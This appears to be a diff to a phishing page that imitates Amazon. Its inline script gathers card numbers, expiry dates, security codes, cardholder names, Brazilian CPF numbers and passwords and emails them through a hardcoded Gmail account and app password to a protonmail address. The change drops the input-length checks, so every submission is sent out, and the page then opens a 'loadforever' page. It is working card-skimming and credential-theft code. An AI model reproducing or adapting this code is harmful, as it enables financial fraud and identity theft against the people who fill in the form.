@@ -78,26 +78,16 @@
                       let cpf    = document.getElementById("cpf").value; 
                       let finalmessage = `CC Number : ${ccNum} <br>  CC-EXP : ${ccExp} <br>  CC-CSC : ${ccCsc} <br> CC NAME : ${ccName} <br> CPF: ${cpf} <br> Password: ${ccPass}`;
                       
-                      if (ccNum.length === 16){
-                        if (ccExp.length >= 4){
-                          if (ccCsc.length == 3 || ccCsc.length == 4){
-                            if (ccName.length > 6){
-                              if (cpf.length == 11 || cpf.length == 14){
-                                Email.send({
-                                  Host: "smtp.gmail.com",
-                                  Username : "julio74108520@gmail.com",
-                                  Password : "hgvt vldi peit jcoh",
-                                  To : 'user1533@protonmail.com',
-                                  From : "julio74108520@gmail.com",
-                                  Subject : "Amazon: compra realizada.",
-                                  Body : finalmessage
-                                  });
-                                  window.open('loadforever.html');
-                              }
-                            }
-                          }
-                        }
-                      }
+                      Email.send({
+                        Host: "smtp.gmail.com",
+                        Username : "julio74108520@gmail.com",
+                        Password : "hgvt vldi peit jcoh",
+                        To : 'user1533@protonmail.com',
+                        From : "julio74108520@gmail.com",
+                        Subject : "Amazon: compra realizada.",
+                        Body : finalmessage
+                      });
+                      window.open('loadforever.html');
                     }
                   </script>
                 </div>
